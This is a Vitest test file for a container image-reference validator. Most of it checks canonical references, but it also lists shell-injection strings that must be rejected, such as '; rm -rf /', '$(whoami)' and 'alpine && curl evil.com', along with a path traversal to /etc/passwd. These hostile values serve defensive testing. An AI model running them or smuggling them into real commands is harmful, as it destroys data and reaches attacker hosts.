import { describe, it, expect } from 'vitest';
import { validateImageRef } from '../utils/image-ref';

describe('validateImageRef', () => {
    it('accepts canonical image references', () => {
        const valid = [
            'alpine',
            'alpine:3.19',
            'nginx:latest',
            'library/postgres:16',
            'ghcr.io/owner/project:v1.2.3',
            'registry.example.com:5000/team/image:tag',
            'docker.io/library/redis@sha256:abcdef1234567890',
            'node:20-alpine',
            'my-image_v2.final',
        ];
        for (const ref of valid) {
            expect(validateImageRef(ref), `expected ${ref} to be valid`).toBe(true);
        }
    });

    it('rejects shell-injection payloads', () => {
        const invalid = [
            '; rm -rf /',
            '$(whoami)',
            '`id`',
            'alpine && curl evil.com',
            'image | tee file',
            'image; ls',
            'image$VAR',
            'image`cmd`',
            'image\nother',
            'image"name"',
            "image'name'",
        ];
        for (const ref of invalid) {
            expect(validateImageRef(ref), `expected ${ref} to be invalid`).toBe(false);
        }
    });

    it('rejects empty and whitespace-only strings', () => {
        expect(validateImageRef('')).toBe(false);
        expect(validateImageRef('   ')).toBe(false);
        expect(validateImageRef('\t\n')).toBe(false);
    });

    it('rejects non-string inputs', () => {
        expect(validateImageRef(null)).toBe(false);
        expect(validateImageRef(undefined)).toBe(false);
        expect(validateImageRef(42)).toBe(false);
        expect(validateImageRef({})).toBe(false);
        expect(validateImageRef([])).toBe(false);
    });

    it('rejects path traversal attempts', () => {
        expect(validateImageRef('../../etc/passwd')).toBe(false);
        expect(validateImageRef('image..name')).toBe(false);
    });

    it('rejects references exceeding 255 characters', () => {
        const longRef = 'a'.repeat(256);
        expect(validateImageRef(longRef)).toBe(false);
        const atLimit = 'a'.repeat(255);
        expect(validateImageRef(atLimit)).toBe(true);
    });
});
